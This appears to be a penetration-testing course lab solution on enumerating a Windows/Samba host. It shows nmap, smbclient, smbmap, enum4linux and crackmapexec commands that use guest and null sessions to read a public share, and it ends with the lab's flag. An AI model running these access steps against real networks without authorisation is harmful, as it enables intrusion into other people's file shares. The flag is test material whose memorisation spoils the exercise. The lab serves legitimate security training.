# Lab 9.1: Windows Network Assessment

**Track:** Windows | **Difficulty:** Intermediate | **Duration:** 120 minutes

## Learning Objectives

- Perform a complete enumeration of a Windows network environment
- Apply a structured assessment methodology (reconnaissance → enumeration → vulnerability identification → exploitation)
- Discover and exploit guest/anonymous SMB access; a critical misconfiguration
- Use multiple tools for SMB enumeration (smbclient, smbmap, enum4linux, crackmapexec)
- Understand why anonymous access to file shares is a serious security finding
- Capture the flag

## Scenario

You're entering the final phase of your penetration test for **FinanceCorp**. James Mitchell has requested a comprehensive network assessment that combines all the techniques you've learned throughout the engagement.

This assessment will demonstrate your ability to systematically assess a Windows network environment, from initial reconnaissance through service enumeration to credential discovery. FinanceCorp needs this complete picture to understand their overall security posture.

**Your objective:** Perform a complete enumeration of FinanceCorp's Windows network. Combine all reconnaissance and enumeration techniques to create a comprehensive network assessment report.

---

## Target Information

| Property | Value |
|----------|-------|
| Target IP | `10.10.{your_subnet}.10` |
| Services | HTTP (80), SMB (445), RDP (3389) |
| Credentials | None needed; guest access is the vulnerability |
| Flag location | `http://<target_ip>/flag.txt` |

---

## Solution Walkthrough

### Phase 1: Reconnaissance: Service Discovery

Start with a port scan to discover running services on the target.

**Step 1: Service version scan**

```bash
nmap -sV -sC -p 80,445,3389 <target_ip>
```

**Expected output:**

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx
445/tcp  open  netbios-ssn   Samba smbd 4.x
3389/tcp open  ms-wbt-server xrdp

Host script results:
| smb2-security-mode:
|   Message signing enabled but not required
```

**What to note:**

- **Port 80 (HTTP):** An nginx web server is running; the flag is served here
- **Port 445 (SMB):** Samba file sharing is running; guest access is a key finding
- **Port 3389 (RDP):** Remote Desktop is running via xrdp
- The `-sC` flag runs default NSE scripts, which may reveal SMB security configuration

**Step 2: Document the findings**

```
Reconnaissance Results:
- HTTP (80): nginx; Web server
- SMB (445): Samba smbd; File sharing service
- RDP (3389): xrdp; Remote Desktop
- SMB message signing: Enabled but not required
```

---

### Phase 2: SMB Enumeration: Anonymous/Guest Access

The critical step: determine if SMB allows unauthenticated access.

**Step 3: List SMB shares without credentials (null session)**

```bash
smbclient -L //<target_ip> -N
```

The `-N` flag suppresses the password prompt and connects without authentication.

**Expected output:**

```
	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      Public share
	IPC$            IPC       IPC Service
```

**Key finding:** A share named `public` is visible without any credentials. This is a significant misconfiguration.

**Step 4: Check share permissions with smbmap**

```bash
smbmap -H <target_ip> -u guest -p ""
```

**Expected output:**

```
[+] Guest session   	IP: <target_ip>:445	Name: <target_ip>
	Disk        Permissions     Comment
	----        -----------     -------
	public      READ ONLY       Public share
	IPC$        NO ACCESS       IPC Service
```

This confirms:
- **Guest access is enabled**: no credentials required
- The `public` share has **READ** permissions for guest users

**Step 5: Alternative enumeration with enum4linux**

```bash
enum4linux -a <target_ip>
```

This runs a comprehensive enumeration including share listing, user enumeration, group enumeration, and OS information. It will confirm the same guest-accessible shares.

**Step 6: Quick check with CrackMapExec**

```bash
# Test null session
crackmapexec smb <target_ip> -u "" -p ""

# Test guest access
crackmapexec smb <target_ip> -u guest -p ""

# List shares
crackmapexec smb <target_ip> -u guest -p "" --shares
```

CME provides a quick yes/no answer on whether guest access works.

---

### Phase 3: Vulnerability Identification

Based on enumeration, the key vulnerability is:

| Finding | Severity | Description |
|---------|----------|-------------|
| Guest access enabled on SMB | **High** | No credentials required to connect |
| `public` share readable by anyone | **Critical** | Sensitive files exposed to unauthenticated users |
| SMB message signing not required | Medium | Potential for relay attacks |

**Guest access** means any user on the network can list and read files from the `public` share without any authentication. In a real environment, this could expose sensitive documents, credentials, or configuration files.

---

### Phase 4: Exploitation: Retrieving the Flag

**Step 7: Retrieve the flag via HTTP**

The flag is hosted on the nginx web server discovered during reconnaissance.

```bash
curl http://<target_ip>/flag.txt
```

The flag is displayed: `OCR{n3tw0rk_3num}`

**Alternative: Access the flag via SMB**

The flag file is also accessible through the guest-readable `public` share discovered during enumeration.

```bash
smbclient //<target_ip>/public -N -c "more flag.txt"
```

**Alternative: Interactive SMB session**

```bash
smbclient //<target_ip>/public -N
smb: \> ls
  .                    D        0  ...
  ..                   D        0  ...
  flag.txt             N       XX  ...

smb: \> more flag.txt
smb: \> exit
```

**Alternative using smbmap:**

```bash
# List all files in all shares
smbmap -H <target_ip> -u guest -p "" -R

# Download a specific file
smbmap -H <target_ip> -u guest -p "" -R public -A flag.txt
```

**Alternative: Mount the share locally**

```bash
sudo mkdir -p /mnt/public
sudo mount -t cifs //<target_ip>/public /mnt/public -o guest
cat /mnt/public/flag.txt
sudo umount /mnt/public
```

---

### Phase 5: RDP Assessment (Optional)

Check if RDP also has misconfigurations:

```bash
# Test if RDP accepts empty credentials
crackmapexec rdp <target_ip> -u "" -p ""
crackmapexec rdp <target_ip> -u guest -p ""
```

RDP typically requires valid credentials, unlike the misconfigured SMB share. This demonstrates that not all services on the same host have the same security posture.

---

## Assessment Summary

| Phase | Finding | Severity |
|-------|---------|----------|
| Recon | HTTP (80), SMB (445), and RDP (3389) running | Info |
| Enum | Guest access enabled on SMB | High |
| Enum | `public` share readable by anyone | Critical |
| Exploit | Flag file retrieved via HTTP | Critical |
| RDP | Requires valid credentials | Info |

---

## Key Takeaways

- **No credentials were needed**: guest access was the vulnerability
- The `-N` flag in smbclient suppresses the password prompt and connects without authentication
- Guest-accessible SMB shares are a **critical misconfiguration** in enterprise environments
- Always check for anonymous/guest access before attempting credential attacks; the easiest path is often the right one
- Network assessments follow a structured methodology: reconnaissance → enumeration → vulnerability identification → exploitation

---

## Educational Context

### Network Assessment Methodology

A professional network assessment follows these phases:

```
Phase 1: Reconnaissance    → Discover hosts and services
Phase 2: Enumeration       → Gather detailed service information
Phase 3: Vulnerability ID  → Identify weaknesses and misconfigurations
Phase 4: Exploitation      → Demonstrate impact of vulnerabilities
Phase 5: Documentation     → Report findings
```

### Real-World Impact

In actual penetration tests:
- SMB shares with guest access frequently expose sensitive documents
- Financial institutions may accidentally share internal reports, credentials, or customer data
- This finding would be reported as a **Critical** vulnerability requiring immediate remediation
- Remediation: disable guest access, require authentication, implement least-privilege share permissions

### Tool Progression

| Lab | Tools | Focus |
|-----|-------|-------|
| Labs 8.1-8.4 | smbclient, xfreerdp, evil-winrm | Manual single-target exploitation |
| Lab 8.5 | CrackMapExec | Automated credential testing |
| **Lab 9.1** | **nmap, smbclient, smbmap, enum4linux, CME** | **Comprehensive network assessment** |
| Labs 9.2-9.3 | CME + manual tools | Multi-service and full penetration test |

---

## Hints

1. Start with a service version scan; `nmap -sV -sC` reveals HTTP, SMB, and RDP
2. You do NOT need credentials; focus on anonymous/guest access methods
3. Use `smbclient -L //<target> -N` to list shares without a password
4. The `-N` flag is key; it means "no password"
5. The flag is served over HTTP; try `curl http://<target>/flag.txt`
6. SMB guest access to the `public` share is a key finding for the assessment

## Common Mistakes

- Trying to brute-force credentials when guest access works without any
- Forgetting the `-N` flag with smbclient (it will prompt for a password)
- Not checking all shares; `public` is the accessible one, `IPC$` is not
- Skipping the enumeration phase and going straight to exploitation

## Flag

```
OCR{n3tw0rk_3num}
```
